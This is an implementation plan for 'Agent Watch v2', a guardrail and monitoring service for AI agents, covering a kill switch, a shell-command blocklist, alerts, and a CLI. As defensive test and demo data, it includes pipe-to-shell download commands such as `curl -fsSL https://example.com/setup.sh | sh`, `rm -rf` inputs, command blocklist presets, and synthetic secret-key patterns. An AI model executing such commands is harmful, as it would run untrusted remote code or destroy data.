# Implementation Plan: Agent Watch v2

## Overview

v2 builds on the completed v1 spec in `.kiro/specs/agent-watch/` (groups 1 to 7; only 7.5, the final rehearsal, stays open and is closed by 17.5 here). Build order follows demo value over risk: the kill switch first (new routes, new SDK poll, one button), then the shell-command guard (same shape as the path blocklist), then the dashboard chart and polish (no backend change), then webhook alerts and the rate limit, then the CLI. Groups 14 to 16 are optional and only start if group 13 is done before 2026-10-18. Group 17 is the feature freeze, docs, smoke test, and rehearsal, and it is required.

Rules carried over from v1: every leaf task is under an hour and carries its own tests, written first. Where a design Property applies, its Hypothesis test is part of that task and is required, uses `@settings(max_examples=100)` (filesystem or timing properties add `deadline=None`), and carries the tag comment `# Feature: agent-watch-v2, Property N: <title>`. Backend tests live in `backend/tests/`, SDK tests in `sdk/tests/`, dashboard tests next to the code under `dashboard/` (vitest). Tests never need AWS or network. Every v1 test keeps passing; if a task has to change one, the commit message says why.

Commit after each leaf task using `feat(scope)`, `test(scope)`, `fix(scope)`, or `chore(scope)`. Scopes: `backend`, `sdk`, `demo`, `dashboard`, `infra`, `docs`. Template changes (8.1, 11.2, 16.x) go on a `feat/<name>` branch with a PR through the GitHub MCP server, and Tejaswi merges after approving the change set.

### How to run this spec in Kiro

Start every build chat with:

> Read PROGRESS.md, then .kiro/specs/agent-watch-v2/requirements.md, design.md, and tasks.md. The v1 spec in .kiro/specs/agent-watch/ is complete and is the reference for the glossary, the existing code shape, and Properties 1 to 29; read its design.md sections only when a task points at them. Tell me in 3 lines: the current state, the next unchecked v2 task you will do, and what done looks like. Then start. One task at a time, tests first, commit after each.

Keep 6 to 8 leaf tasks per chat. After each group's checkpoint, open a fresh chat and run `#fresh-review` on `git diff <checkpoint-commit>..HEAD` against this file. Feed the findings back as `fix(scope)` tasks under that group.

### Schedule

| Dates | Group | Demo moment it adds |
| --- | --- | --- |
| Oct 12 to 13 | 8 Kill switch | "Pause it" from the dashboard, agent stops within 5 s |
| Oct 14 to 15 | 9 Shell-command guard | `curl … \| sh` blocked live |
| Oct 15 to 16 | 10 Spend chart and polish | The spend spike and the cap hit, visible |
| Oct 16 to 17 | 11 Webhook alerts, 12 Rate limit | Discord message arrives on camera; loop caught by calls/min |
| Oct 17 to 18 | 13 CLI | `agentwatch init` in the "easy to adopt" story |
| Oct 18 only if ahead | 14 to 16 optional | Redaction, domains, alarms |
| **Oct 19** | **17 Freeze: docs, e2e, rehearsal** | |
| Oct 20 to 22 | Record, submit (docs/SUBMISSION.md) | |

## Tasks

- [ ] 8. Kill switch (pause and resume)
  - [x] 8.1 Add Pause_State to the store and the status service functions
    - Write the failing tests first. In `backend/tests/test_service_status.py`: `get_status` for a missing agent returns 200 `{paused: false, pausedAt: null}` and creates nothing; `put_status` on a missing agent creates the record with `EMPTY_CONFIG` and the submitted state; PUT then GET round trip; `pausedAt` is the floored server ts when paused and null when resumed; a wrong key gets 403 and changes nothing; bodies `{}`, `{"paused": "yes"}`, `{"paused": 1}`, `{"paused": true, "x": 1}` get 400 naming the field. Extend `backend/tests/test_store_dynamo.py`: `set_paused` issues `UpdateItem` with `SET paused = :p, pausedAt = :t`, condition `keyVerifier = :kv`, NULL `:t` on resume, and maps `ConditionalCheckFailedException` to `False`. Add Property 31 in `backend/tests/test_properties_status.py` (extend the generator to check `guardrails` is unchanged by status PUTs and that the inventory `paused` mirrors the record).
    - Implement per the design: `AgentRecord.paused`/`paused_at` with defaults, `record_to_item`/`item_to_record`, `Store.set_paused`, `InMemoryStore.set_paused`, `DynamoStore.set_paused`, `service.get_status`, `service.parse_status`, `service.put_status`, `_inventory_item["paused"]`.
    - Extend Property 6 (read routes never create records) with a `get_status` clause in its existing test.
    - _Requirements: 27.1, 27.2, 27.3, 27.4, 27.5, 27.6, 27.7, 36.3_
    - Commit: `feat(backend): pause state, get_status and put_status`

  - [x] 8.2 Route the status endpoints and accept `paused` blocked events
    - DONE: PR #4 merged and deployed 2026-10-14. `GET /agents/demo-bot/status` returned 200 `{"paused": false}` with the right key and 403 with a wrong key.
    - Write the failing tests first. In `backend/tests/test_handler.py`: `GET /agents/{agentId}/status` and `PUT /agents/{agentId}/status` route to the new service functions, 401 without headers, 400 on a bad body, and the route table has exactly eight entries. In `backend/tests/test_template.py`: eight `HttpApi` events including `GetStatus` and `PutStatus`, and still exactly two policies. In `backend/tests/test_validation.py` and `test_alerts.py`: a `blocked` event with `violationType: "paused"` and `meta: {action: "llm_call", model: "m"}` validates with cost 0.0; `format_alert` for it lists `action` and `model`. Start Property 39 in `backend/tests/test_properties_blocked_types.py` with the `paused` clause and Property 38 in `backend/tests/test_properties_alert_content.py` (extend both in later groups).
    - Implement: `ROUTES` entries and `_get_status`/`_put_status` in `handlers/api.py`; `GetStatus`/`PutStatus` events in `backend/template.yaml`; `VIOLATION_TYPES` gains `paused` and `TYPE_FIELDS[("blocked", "paused")]`; `format_alert` branch for `paused`.
    - Branch `feat/status-routes`, open a PR with the GitHub MCP server, and ask Tejaswi to approve. After merge, Tejaswi deploys with `UsePreviousValue` for `AlertEmail` and `DashboardOrigin`, then checks `GET /agents/demo-bot/status` returns 200 with the right key and 403 with a wrong one. Record the result in `PROGRESS.md`.
    - _Requirements: 27.2, 27.4, 27.12, 27.19, 15.5_
    - Commit: `feat(infra): status routes; feat(backend): paused blocked events and alert text`

  - [x] 8.3 SDK status poll, Pause_State cache, and `AgentPaused`
    - Write the failing tests first. In `sdk/tests/fakes.py`, route `/status` requests to `status_outcomes`/`status_requests` with a default `200 {agentId, paused: false, pausedAt: null}` (mirror the `/spend` routing so no older test changes). In `sdk/tests/test_status_sync.py`: `init` fetches status once; a refresh happens only when 5 s have passed on the fake clock; failures, non-2xx, and malformed bodies (`paused: "true"`, missing key) keep the last state and warn; `PAUSE_NOT_ACTIVE_MSG` is logged exactly while no fetch has ever succeeded; `AgentPaused` is a `GuardrailBlocked` with `violation_type == "paused"`; `__init__.py` exports it.
    - Implement per the design: `CONTROL_INTERVAL_S`, `PAUSE_NOT_ACTIVE_MSG`, `AgentPaused`, `ApiClient.get_status`, `Watcher._fetch_status`, `_maybe_refresh_status`, `_check_paused`, `_pause_reported` reset on resume, and the `init` call.
    - _Requirements: 27.8, 27.9, 27.10, 27.11_
    - Commit: `feat(sdk): status poll and AgentPaused`

  - [x] 8.4 Enforce the pause before every LLM and tool call, once-per-episode reporting
    - Write the failing tests first. In `sdk/tests/test_pause_enforcement.py`: while paused, a wrapped Bedrock `converse`, a wrapped Anthropic `messages.create`, and a wrapped tool with no path arguments all raise `AgentPaused` and never invoke the inner call; exactly one `paused` blocked event is sent for the first blocked call, none for the next ones; after a status response with `paused: false`, calls run again and a later pause sends one new event; the pause check runs before the spend check (a paused agent over its cap raises `AgentPaused`, not `SpendCapExceeded`). Add Property 30 in `sdk/tests/test_properties_pause.py` (`deadline=None`).
    - Implement: `_check_paused("llm_call", model=...)` as the first line of `check_spend`; `_check_paused("tool_call", tool=...)` as the first line of the tool wrapper, before candidates are computed.
    - _Requirements: 27.12, 27.13, 27.14_
    - Commit: `feat(sdk): enforce pause before every call, one event per episode`

  - [x] 8.5 Dashboard: pause button, status in the summary, Status column
    - Write the failing tests first. `dashboard/lib/api.test.ts`: `getStatus` GETs and `putStatus` PUTs `{"paused": bool}` with the credential headers. `dashboard/components/PauseButton.test.tsx`: shows "Pause agent" when active, first click shows "Confirm pause", second click PUTs and shows "Resume agent"; resume is one click; a failing PUT shows the error and keeps the old label. `dashboard/components/InventoryTable.test.tsx`: Status column shows "Paused" for `paused: true` and "Active" otherwise. `dashboard/app/agent/page.test.tsx`: the page renders the pause state from `getStatus`.
    - Implement: `StatusResponse` type and `InventoryItem.paused`; `getStatus`/`putStatus`; `PauseButton.tsx`; Status column; the agent page fetches status and refreshes it after a pause/resume. `npm run build` still exports `/` and `/agent`.
    - _Requirements: 27.15, 27.16, 27.17, 29.10_
    - Commit: `feat(dashboard): pause and resume control, status column`

  - [x] 8.6 Demo loop: `--sleep`, catch every guardrail
    - Write the failing tests first. Extend `sdk/tests/test_demo_agent.py`: `--sleep 2` parses (floats ≥ 0, negative rejected); the loop calls the injected `sleep` between runs and not after the last; an `AgentPaused` from the wrapped client prints `run i/N: AgentPaused: ...`, breaks, and exits 0; `SpendCapExceeded` behaves as before.
    - Implement in `demo/demo_agent.py`: `--sleep` argument, `main(..., sleep_s=0.0, sleep=time.sleep)`, catch `GuardrailBlocked` and print `type(e).__name__` and `e.detail`.
    - _Requirements: 27.18_
    - Commit: `feat(demo): --sleep and generic guardrail handling in the loop`

  - [x] 8.7 Checkpoint: kill switch on AWS
    - DONE 2026-10-14 (Tejaswi): loop stopped with AgentPaused, email arrived, badge + "Paused since" + timeline row shown, resume worked. Pause-to-stop time not yet recorded.
    - Run `pytest` in `backend/` and `sdk/` and `npx vitest --run` in `dashboard/`; all pass. Ask Tejaswi to: confirm the status routes are deployed (8.2) and Amplify rebuilt (8.5); run `python demo/demo_agent.py --loop 20 --sleep 2`, press **Pause agent** then **Confirm pause** on `demo-bot`, and see `run N/20: AgentPaused: ...` within about 5 s plus the alert email; press **Resume agent** and run `--loop 1` to confirm it runs again. Record the observed pause-to-stop time in `PROGRESS.md` and tick this task.
    - _Requirements: 27.12, 27.15, 27.16_

- [x] 9. Shell-command guard
  - [x] 9.1 Add `blockedCommands` to the Guardrail_Config with validation
    - Write the failing tests first. Extend `backend/tests/test_rules.py`: a v1 body (two keys) parses with `blocked_commands == ()`; `to_json` always emits `blockedCommands`; invalid lists (not a list, 101 entries, empty entry, 257 chars, `"("`, `"[a-"`) return a `ValidationError` naming `blockedCommands` with no `re.error` text echoed; a v1-shaped stored `guardrails` map round-trips through `item_to_record`. Add Property 32 in `backend/tests/test_properties_config_v2.py` and Property 34 in `backend/tests/test_properties_commands.py`. Keep Property 3's and Property 5's existing tests untouched; add the new key to their generators only if they already generate from `KEYS`.
    - Implement in `rules.py`: the dataclass field with a default, `KEYS`/`REQUIRED_KEYS`, `MAX_COMMANDS`, `MAX_COMMAND_LEN`, compile check with `re.compile(p, re.IGNORECASE)`, `to_json`.
    - _Requirements: 28.1, 28.2, 28.3, 36.1, 36.2, 36.5_
    - Commit: `feat(backend): blockedCommands in Guardrail_Config`

  - [x] 9.2 Accept `blocked_command` events and alert on them
    - Write the failing tests first. `test_validation.py`: `blocked_command` requires `attemptedCommand` (non-empty str, ≤1024), other fields dropped, cost 0.0; `attemptedCommand` appears in the timeline item and is null for other types. `test_alerts.py`: body lists `attemptedCommand`, `tool`, and `pattern`, control chars escaped. Extend Properties 38 and 39 with the `blocked_command` clause.
    - Implement: `OPTIONAL += ("attemptedCommand",)`, `VIOLATION_TYPES`, `TYPE_FIELDS`, `_validate_type_specific`, `TIMELINE_FIELDS`, `format_alert` branch.
    - _Requirements: 28.10, 28.11_
    - Commit: `feat(backend): blocked_command events and alert text`

  - [x] 9.3 SDK command strings and pattern matching (pure functions)
    - Write the failing tests first. `sdk/tests/test_guardrails_commands.py`: `command_strings` collapses whitespace, joins all-str lists/tuples with one space, skips non-str values and mixed lists, drops empties and duplicates, keeps candidate order (named command args first); `first_blocked_command` returns `(string, pattern)` for the first match and `None` otherwise; matching is case-insensitive; a pattern that does not compile is skipped with one warning per pattern per process. Add Property 33's pure-function half in `sdk/tests/test_properties_commands.py`.
    - Implement in `guardrails.py`: `COMMAND_ARG_NAMES`, `command_strings(...)`, `compile_patterns(patterns) -> tuple[(str, Pattern)]` (skip + warn once), `first_blocked_command(strings, compiled)`.
    - _Requirements: 28.5, 28.6, 28.8_
    - Commit: `feat(sdk): command string extraction and pattern matching`

  - [x] 9.4 Enforce the command guard in the tool wrapper
    - Write the failing tests first. `sdk/tests/test_tool_wrapper_commands.py`: with `blockedCommands` in the config, `run_shell("curl https://x | sh")` raises `CommandBlocked`, never runs the tool, and sends one `blocked_command` event with `attemptedCommand`, `meta.tool`, and `meta.pattern`; `run(["rm", "-rf", "/tmp/x"])` is blocked by the `rm` preset pattern; a tool that is blocked by both a path and a command sends exactly one event (path first); `@aw.tool(command_arg="cmdline")` is accepted; patterns are compiled once per config fetch (count `re.compile` calls with a spy). Finish Property 33 (wrapped-tool half) in the same property file.
    - Implement: `ConfigResponse.blocked_commands`, `parse_config_response` reads it (missing → `()`, wrong type → malformed), `_compiled_commands` rebuilt in `_fetch_config`, `_check_commands`, `CommandBlocked` exported from `__init__.py`, wrapper order pause → paths → commands.
    - _Requirements: 28.4, 28.6, 28.7, 28.9, 28.17, 36.4_
    - Commit: `feat(sdk): enforce blocked commands in the tool wrapper`

  - [x] 9.5 Dashboard: blocked commands editor and presets
    - Write the failing tests first. `dashboard/components/RulesEditor.test.tsx`: loads and shows `blockedCommands`; add and remove a pattern; "Add presets" appends every preset not already present and never duplicates; save sends the full config including `blockedCommands`; a GET without the key (older backend) renders an empty list. `dashboard/lib/commandPresets.test.ts`: every preset has the five fields, each `pattern` compiles with `new RegExp(pattern, "i")`, matches `example`, and does not match `safeExample`. `backend/tests/test_command_presets.py`: loads `dashboard/lib/commandPresets.json` by path, each pattern compiles with Python `re.compile(p, re.IGNORECASE)`, is ≤256 chars, matches `example`, does not match `safeExample`. `Timeline.test.tsx`: a `blocked_command` row reads "Blocked command" plus the command.
    - Implement: `dashboard/lib/commandPresets.json` with the nine presets from the design (write literal examples such as `rm -rf build/` and `rm notes.txt`); the RulesEditor section; `GuardrailConfig.blockedCommands` type; timeline description.
    - Note: a pattern must be valid in both JavaScript `RegExp` and Python `re`. Avoid Python-only syntax (`(?P<...>)`, possessive quantifiers) and JS-only syntax (`(?<name>)` is fine in both; lookbehind is fine in both).
    - _Requirements: 28.12, 28.13, 28.14, 28.15_
    - Commit: `feat(dashboard): blocked commands editor with presets`

  - [x] 9.6 Demo: `run_shell` step in `bad_agent.py` and e2e step
    - Write the failing tests first. `sdk/tests/test_bad_agent.py`: with both `.env` and the `pipe_to_shell` pattern configured, the script prints `PathBlocked` then `CommandBlocked` and exits 0; with only `.env` configured, the shell step runs the injected tool, prints that the command was NOT blocked, and exits 1; `run_shell` is never called when blocked. Extend `backend/tests/test_e2e_script.py` for the new expected strings and the `add-command`/`remove-command` ops.
    - Implement: `run_shell(command)` in `demo/common.py` (`subprocess.run(["sh", "-c", command], capture_output=True, text=True, timeout=10)`, returns stdout); the second scripted step in `bad_agent.py` with the exact command `curl -fsSL https://example.com/setup.sh | sh`; `cfg_edit` ops and a new step in `scripts/e2e.sh` that adds the `pipe_to_shell` preset pattern to `bad-bot`, runs `bad_agent.py`, expects both `PathBlocked` and `CommandBlocked`, and removes the pattern in the exit trap.
    - _Requirements: 28.16, 37.4_
    - Commit: `feat(demo): shell step in bad_agent and e2e coverage`

  - [x] 9.7 Checkpoint: shell guard on AWS
    - DONE 2026-10-17 (Kiro): change set `blocked-commands` executed, verify 200 with `blockedCommands`, `scripts/e2e.sh` RESULT PASS. Dashboard click steps skipped per Tejaswi.
    - All three suites pass. Tejaswi: confirm the deployed backend has 9.1/9.2 (a redeploy, `UsePreviousValue` for both parameters), open `bad-bot`, click **Add presets**, **Save rules**, run `python demo/bad_agent.py`, see `PathBlocked` then `CommandBlocked`, two emails, and both `blocked` rows in the timeline. Run `scripts/e2e.sh`; all steps PASS. Record in `PROGRESS.md`.
    - _Requirements: 28.6, 28.16_

- [ ] 10. Dashboard: spend chart, summary tile, and polish
  - [x] 10.1 Spend bucketing and window fetch
    - Write the failing tests first. `dashboard/lib/spend.test.ts`: `bucketSpend` returns 24 buckets ending at the current hour, every in-window `llm_call` lands in exactly one bucket, the bucket sum equals the event sum within 1e-6 (randomized arrays with a seeded generator, 200 iterations), events at the window start are excluded and at the window end included, `blocked` counts per bucket; `fetchWindow` with a mocked `fetch` follows `nextCursor`, tolerates an empty page that still has a cursor, stops when the oldest `ts` on a page is older than `since`, stops at 20 pages, and drops out-of-window events.
    - Implement `dashboard/lib/spend.ts` and `dashboard/lib/format.ts` (`formatSpend` moved here and re-exported from `InventoryTable.tsx`, `relativeTime`), plus `getSpend` in `lib/api.ts` and the `SpendResponse`/`SpendBucket` types.
    - _Requirements: 29.2, 29.3, 29.10_
    - Commit: `feat(dashboard): spend bucketing and timeline window fetch`

  - [x] 10.2 `SpendChart` component
    - Write the failing tests first. `dashboard/components/SpendChart.test.tsx`: renders 24 `<rect>` bars with `<title>` text "<hour>: $<cost>, <n> blocked"; buckets with blocks render a marker with the count; all-zero data renders the axis and "No LLM calls in the last 24 hours"; the y-axis max is at least `cap / 24` when a cap is given.
    - Implement `components/SpendChart.tsx` as inline SVG (viewBox, `preserveAspectRatio`, responsive width) with no new dependency.
    - _Requirements: 29.1, 29.4, 29.11_
    - Commit: `feat(dashboard): 24h spend chart`

  - [x] 10.3 `AgentSummary` tile and page wiring
    - Write the failing tests first. `dashboard/components/AgentSummary.test.tsx`: shows rolling spend (4 decimals), "no cap" or the cap, a `role="progressbar"` with `aria-valuenow` = min(100, spend/cap·100), red styling at ≥100%, the pause state, and relative last activity. `dashboard/app/agent/page.test.tsx`: the page loads status, spend, config, and window events, renders the tile and chart above the rules, refreshes on a 30 s fake timer, and refetches after `onSaved`/`onChanged` callbacks.
    - Implement `components/AgentSummary.tsx`; wire `app/agent/page.tsx` (parallel fetches with `Promise.all`, a single refresh function, `setInterval` cleared on unmount); `RulesEditor` and `PauseButton` accept `onSaved`/`onChanged`.
    - _Requirements: 29.5, 29.6_
    - Commit: `feat(dashboard): agent summary tile and 30s refresh`

  - [x] 10.4 Timeline rows: cost, relative time, details, every violation type
    - Write the failing tests first. `Timeline.test.tsx`: `llm_call` rows show the cost; the time cell shows `relativeTime` with `title` = exact ts; a "Details" toggle shows and hides formatted `meta`; `describeEvent` covers all seven Violation_Types with the wording from Req 29.8.
    - Implement `describeEvent` in `lib/format.ts` and the row changes in `Timeline.tsx`; `TimelineItem` gains `attemptedCommand`/`attemptedUrl`.
    - _Requirements: 29.7, 29.8_
    - Commit: `feat(dashboard): richer timeline rows`

  - [x] 10.5 Inventory: stale marker and build check
    - Write the failing tests first. `InventoryTable.test.tsx`: "stale" appears next to a last activity older than 24 h and not for a recent one; "not yet reported" is unchanged. `dashboard/lib/build.test.ts` is unchanged; run `npm run build` and confirm `out/` has `/` and `/agent`.
    - Implement the stale marker.
    - _Requirements: 29.9_
    - Commit: `feat(dashboard): stale marker in the inventory`

  - [x] 10.6 Checkpoint: dashboard on Amplify
    - DONE 2026-10-17 (Tejaswi): chart, summary tile, and Details work on Amplify; the 3 e2e alert emails arrived. Two chart bugs found, fixed in 10.7 and 10.8.
    - Dashboard suite passes; `npm run build` succeeds. Tejaswi: after the Amplify build, open `demo-bot`, see the chart with today's runs and the `spend_cap` and `paused` blocks marked, the tile with spend vs. cap, and a row's Details. Note anything off in `PROGRESS.md` and fix as `fix(dashboard)` tasks under this group.
    - _Requirements: 29.1, 29.5_

  - [x] 10.7 Fix: last x-axis label clipped at the right edge
    - Write the failing test first. `SpendChart.test.tsx`: the label for the last bucket is anchored at the end (it never extends past the right edge); other labels stay centered; `labelAnchor` returns start for bucket 0.
    - Implement: `labelAnchor(i, n)` (start / middle / end) by bucket position.
    - _Requirements: 29.1_
    - Commit: `fix(dashboard): keep the last spend chart label inside the chart`

  - [x] 10.8 Fix: chart text stretched by `preserveAspectRatio="none"`
    - Write the failing test first. `SpendChart.test.tsx`: the stretchable SVG contains no `<text>`; hour labels and block counts are HTML elements positioned in percent over the SVG, so they render at a uniform scale.
    - Implement: bars and axis stay in the stretched SVG; labels and markers move to an `aria-hidden` HTML overlay.
    - _Requirements: 29.1, 29.4_
    - Commit: `fix(dashboard): render spend chart text undistorted`

- [ ] 11. Webhook alerts (Discord and Slack) (back in scope 2026-10-17 by Tejaswi, Discord target; 11.3 is hers)
  - [x] 11.1 `WebhookPublisher` and `MultiPublisher`
    - Write the failing tests first. `backend/tests/test_alerts_webhook.py` with a fake opener recording `(url, data, headers, timeout)`: Discord hosts send `{"content": text}`, Slack sends `{"text": text}`, `http://`, other hosts, `discord.com.evil.com`, and `user@discord.com` are rejected with one `webhook_url_rejected` warning that does not contain the URL, and no request; non-2xx raises; text is capped at 1900 chars; timeout is 3.0. `MultiPublisher` calls every publisher once, isolates a raising one, logs the class and exception type only. Add Property 36 in `backend/tests/test_properties_fanout.py` and Property 37 in `backend/tests/test_properties_webhook.py`.
    - Implement per the design in `alerts.py` (standard library only).
    - _Requirements: 30.3, 30.4, 30.5, 30.6, 30.7_
    - Commit: `feat(backend): webhook publisher and alert fan-out`

  - [x] 11.2 Wire the webhook through the handler and the template (code done on `feat/webhook-alerts`; merge and deploy are Tejaswi's)
    - DONE: PR #5 merged (d00ae27) and deployed 2026-10-17. Stack `agent-watch` UPDATE_COMPLETE; the change set modified only `ApiFunction` and `ServerlessHttpApi`, both Replacement False (approved by Tejaswi as a one-time exception for exactly those two). Lambda physical id unchanged, state Active, last update Successful, `ALERT_WEBHOOK_URL` set; API Gateway still has 8 routes and 8 integrations; `scripts/verify_deploy.sh` VERIFY: PASS.
    - Write the failing tests first. `test_handler.py`: with `ALERT_WEBHOOK_URL` set, `_get_deps` builds a `MultiPublisher` with an `SnsPublisher` and a `WebhookPublisher`; unset or empty gives only SNS (reset `_deps` between cases). `test_template.py`: parameter `AlertWebhookUrl` with `Default: ""` and `NoEcho: true`; `Globals.Function.Environment.Variables.ALERT_WEBHOOK_URL` is `!Ref AlertWebhookUrl`; still exactly two policies. `test_readme.py`: README has a "Webhook alerts" section mentioning Discord, Slack, and `AlertWebhookUrl`, and `samconfig.toml` contains no `AlertWebhookUrl`.
    - Implement the handler change, the template parameter and env var, and the README section (how to create a Discord or Slack incoming webhook; deploy with `--parameter-overrides AlertWebhookUrl=...`; later change sets pass `UsePreviousValue`).
    - Branch `feat/webhook-alerts`, PR via the GitHub MCP server, Tejaswi approves and deploys with the URL passed once on the command line (never typed into a file).
    - _Requirements: 30.1, 30.2, 30.8, 30.9_
    - Commit: `feat(infra): AlertWebhookUrl parameter; feat(backend): webhook fan-out in the handler`

  - [ ] 11.3 Checkpoint: Discord or Slack message on a live block
    - PARTIAL 2026-10-17 (Tejaswi): `scripts/e2e.sh` RESULT: PASS (its first steps are the backend, SDK, and dashboard suites); `PathBlocked`, `CommandBlocked`, and `SpendCapExceeded` raised and all three blocked events stored; Discord messages and SNS emails both received; demo guardrails reset. PENDING: the block-to-channel time is not recorded, and no event has been matched to its own Discord message or email. Tick this task when that timing is in `PROGRESS.md` (17.5 records it).
    - All suites pass. Tejaswi: run `python demo/bad_agent.py` with `.env` blocked; the channel shows the alert within seconds, and the email still arrives. Record the block-to-channel time in `PROGRESS.md`.
    - _Requirements: 30.2_

- [ ] 12. Per-agent LLM rate limit (CUT 2026-10-17 by Tejaswi for time; not built)
  - [ ] 12.1 `maxLlmCallsPerMinute` in the config and `rate_limit` events
    - Write the failing tests first. `test_rules.py`: missing → `None`; `1`, `10000` accepted; `0`, `10001`, `1.5`, `true`, `"5"` rejected naming the field; `to_json` emits the key. `test_validation.py`/`test_alerts.py`: a `rate_limit` blocked event with `meta {callsInWindow, maxPerMinute, model}` validates with cost 0.0; the alert lists both numbers. Extend Properties 32, 38, 39 with the new clauses.
    - Implement in `rules.py`, `validation.py`, `alerts.py`.
    - _Requirements: 31.1, 31.2, 31.8, 31.9_
    - Commit: `feat(backend): maxLlmCallsPerMinute and rate_limit events`

  - [ ] 12.2 SDK sliding-window rate limit
    - Write the failing tests first. `sdk/tests/test_rate_limit.py` with the fake clock: limit 3, four calls at t=0,1,2,3 → the fourth raises `RateLimitExceeded` and never invokes the provider; at t=61 the first call has aged out and a call succeeds; blocked calls do not count; exactly one `rate_limit` event per 60 s reporting window; order is pause → rate → spend (a paused agent at its rate limit raises `AgentPaused`; an agent at both its rate limit and its cap raises `RateLimitExceeded`); `parse_config_response` reads the key (missing → None, `"5"` → malformed). Add Property 35 in `sdk/tests/test_properties_rate.py`.
    - Implement per the design: `RATE_WINDOW_S`, `RateLimitExceeded` (exported), `ConfigResponse.max_llm_calls_per_minute`, `_rate_times`, `_rate_lock`, `_rate_reported_until`, `_check_rate`, call order in `check_spend`.
    - _Requirements: 31.3, 31.4, 31.5, 31.6, 31.7_
    - Commit: `feat(sdk): sliding-window LLM rate limit`

  - [ ] 12.3 Dashboard input and timeline wording
    - Write the failing tests first. `RulesEditor.test.tsx`: "Max LLM calls per minute" input loads the value, empty sends `null`, `"5"` sends `5`, a non-integer shows an inline error and does not save. `Timeline.test.tsx`: `rate_limit` rows read "Rate limit: N calls in 60 s (max M)".
    - Implement the input and the description branch (10.4 may already have the branch; keep one).
    - _Requirements: 31.10_
    - Commit: `feat(dashboard): rate limit input`

  - [ ] 12.4 e2e step and checkpoint
    - Write the failing tests first. Extend `test_e2e_script.py` for the `rate` op, the `--loop 4` step, the `RateLimitExceeded` expectation, and the clear in the exit trap.
    - Implement the `e2e.sh` step (limit 2 on `demo-bot`, `demo_agent.py --loop 4`, expect `RateLimitExceeded` on run 3). Tejaswi redeploys the backend (12.1) and runs `scripts/e2e.sh`; all steps PASS. Record in `PROGRESS.md`.
    - _Requirements: 31.11, 37.4_
    - Commit: `test(demo): rate limit in e2e`

- [ ] 13. Onboarding CLI and credential discovery (CUT 2026-10-17 by Tejaswi for time; not built)
  - [ ] 13.1 SDK credential discovery
    - Write the failing tests first. `sdk/tests/test_credentials.py` (extend): with `HOME` set to `tmp_path`, `agentwatch.init(agent_id=...)` with no `api_key` uses `AGENTWATCH_KEY` when set, else the Key_File content stripped, else raises `ValueError` whose message names `api_key`, `AGENTWATCH_KEY`, and `~/.agentwatch_key` and contains no key material; an empty Key_File raises; `owner_id=None` uses `AGENTWATCH_OWNER` or raises; the 3-line snippet test still passes unchanged.
    - Implement `_resolve_key`/`_resolve_owner` in `client.py`; keep `demo/common.py` passing the env values explicitly so `e2e.sh` is unchanged.
    - _Requirements: 32.5, 32.6_
    - Commit: `feat(sdk): key and owner discovery from env and ~/.agentwatch_key`

  - [ ] 13.2 `agentwatch init`
    - Write the failing tests first. `sdk/tests/test_cli_init.py` with `tmp_path` as `HOME` and `capsys`: creates the Key_File with mode `0o600` and a 43-char urlsafe token; prints the key once, the two `export` lines, and the 3-line snippet with the given `--agent`; a second run exits 1 and leaves the file byte-identical; `--force` replaces it and keeps `0o600`; `--quiet` output contains no token; `sdk/pyproject.toml` has `[project.scripts] agentwatch = "agentwatch.cli:main"` (check in `test_packaging.py`). Add Property 42 in `sdk/tests/test_properties_cli.py`.
    - Implement `sdk/agentwatch/cli.py` per the design (`os.open` with `0o600`, `O_EXCL` unless `--force`).
    - _Requirements: 32.1, 32.2, 32.3, 32.4_
    - Commit: `feat(sdk): agentwatch init`

  - [ ] 13.3 `agentwatch doctor`
    - Write the failing tests first. `sdk/tests/test_cli_doctor.py` with a `FakeTransport`: prints `ok` lines for endpoint, credentials, and a guardrail summary (cap, paths, commands, rate limit, paused) and exits 0; a 403 prints `FAIL credentials` and exits 1; a `TransportError` prints `FAIL endpoint` and exits 1; output never contains the key or its hash.
    - Implement the subcommand using `ApiClient` and `parse_config_response`.
    - _Requirements: 32.7_
    - Commit: `feat(sdk): agentwatch doctor`

  - [ ] 13.4 README quickstart, version 0.2.0, checkpoint
    - Write the failing tests first. `test_readme.py`: README has a "Quickstart" section mentioning `agentwatch init` before the 3-line snippet; `test_packaging.py`: `__version__ == "0.2.0"` matches `pyproject.toml`.
    - Implement the README section and the version bump. Tejaswi: `pip install -e sdk` then `agentwatch doctor --agent demo-bot` against the deployed stack prints all `ok`. All suites pass.
    - _Requirements: 32.8, 32.9_
    - Commit: `feat(docs): quickstart with agentwatch init; chore(sdk): 0.2.0`

- [ ] 14. Secret redaction (optional; start only if 13 is done before 2026-10-18)
  - [ ] 14.1 `redact.py` pure functions
    - Write the failing tests first. `sdk/tests/test_redact.py`: each Secret_Pattern matches its canonical synthetic example (`AKIAIOSFODNN7EXAMPLE`, `sk-ant-` + 30 chars, `ghp_` + 36 chars, a three-part `eyJ…` JWT, `-----BEGIN RSA PRIVATE KEY-----`) and not near-misses (`AKIA` + 15 chars, `sk-ant` without the dash tail); `openai_api_key` does not match an Anthropic key; `redact_request` rewrites Bedrock and Anthropic text locations (string content, text blocks, system as string and as blocks) and leaves the input deep-equal. Add Property 40 in `sdk/tests/test_properties_redact.py`.
    - Implement `sdk/agentwatch/redact.py` per the design.
    - _Requirements: 33.6, 33.7_
    - Commit: `feat(sdk): secret redaction functions`

  - [ ] * 14.2 Wire redaction into the proxies, config, validation, and alerts
    - Write the failing tests first. SDK: with `redactSecrets: true`, a prompt with an AWS key reaches the fake provider redacted, one `secret_redacted` blocked event is sent before the call with `meta {kinds, total, model}`, the `llm_call` event has `meta.redactions`, and the call proceeds; with `false` nothing changes; no prompt text appears in any request to the fake transport. Backend: `redactSecrets` parses (missing → false, `"yes"` → 400); `secret_redacted` events validate; alert lists `redactions` and `kinds`. Extend Properties 32, 38, 39.
    - Implement in `client.py` (both proxies), `rules.py`, `validation.py`, `alerts.py`.
    - _Requirements: 33.1, 33.2, 33.3, 33.4, 33.5, 33.8_
    - Commit: `feat(sdk): redact secrets before the model call; feat(backend): redactSecrets and secret_redacted`

  - [ ] 14.3 Dashboard checkbox and demo `--leak` step
    - Write the failing tests first. `RulesEditor.test.tsx`: "Redact secrets in prompts" checkbox round-trips. `test_bad_agent.py`: `--leak` adds a third step whose prompt contains `AKIAIOSFODNN7EXAMPLE`; when redaction is on the script prints `redacted 1 secret(s) before the call` and exits 0.
    - Implement both.
    - _Requirements: 33.9, 33.10_
    - Commit: `feat(dashboard): redact secrets toggle; feat(demo): --leak step`

- [ ] 15. Domain allowlist (optional)
  - [ ] 15.1 `allowedDomains` config and `blocked_domain` events
